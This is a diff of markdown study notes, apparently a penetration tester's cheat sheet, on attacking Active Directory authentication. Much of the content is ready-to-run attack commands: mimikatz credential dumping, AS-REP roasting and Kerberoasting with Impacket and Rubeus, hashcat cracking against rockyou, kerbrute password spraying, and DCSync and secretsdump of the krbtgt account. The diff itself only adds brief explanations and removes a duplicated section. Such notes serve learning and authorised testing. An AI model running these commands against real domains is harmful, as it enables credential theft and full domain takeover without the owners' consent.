@@ -1,8 +1,10 @@
 # AD authentication attacks
 
-## Cached creds
+## Principle - Cached creds
 
-### Hashes
+Credentials are hashed and stored to save authentication processes.
+
+### Hashes - ideal case
 
 https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
 
@@ -13,7 +15,7 @@ m $ privelege::debug
 m $ sekurlsa::logonpasswords
 ```
 
-### Tickets
+### Tickets - retrival of TGT and TGS
 
 In another terminal:
 ```
@@ -83,6 +85,8 @@ PS > .\kerbrute_windows_amd64.exe passwordspray -d targetorg.com .\userstohack.t
 
 ### AS-REQ Roasting
 
+Retrieves hashes used by regular users.
+
 Takes _Do not require Kerberos preauthentication_ to be enabled (disabled by default).
 
 #### From Linux with Impacket-GetNPUsers
@@ -92,16 +96,6 @@ Impacket-GetNPUsers on GitHub: https://github.com/fortra/impacket/blob/master/ex
 $ impacket-GetNPUsers -dc-ip $TargetDcIp -request -outputfile hashes_as-rep_to_roast.txt organisation.com/any_user
 $ hashcat --help | grep -i 'kerberos' # look for "AS-REP" in this case
 $ hashcat -m 18200 hashes_as-rep_to_roast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
-```
-
-#### From Windows with Rubeus
-
-```
-c:\path\to\rubeus.exe asreproast /nowrap
-```
-and `hashcat` back again:
-```
-hashcat -m 18200 hashes_as-rep_to_roast_from_windows.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 ```
 
 #### From Windows with Rubeus
@@ -128,6 +122,8 @@ Get-DomainUser -PreauthNotRequired
 ```
 
 ### Kerberoasting - TGS-REP on SPN
+
+Retrieves hashes used by Service Accounts.
 
 #### With Impacket-GetUserSPNs
 
@@ -189,7 +185,7 @@ impacket-secretsdump -just-dc-user krbtgt organisation.com/someadminuser:"adminp
 
 #### From Windows
 
-From a local admin account (for example):
+From an account with _Replicating Directory Changes_ rights:
 ```
 PS > c:\path\to\mimikatz.exe
 mimikatz # lsadump::dcsync /user:mydomainname\target_username
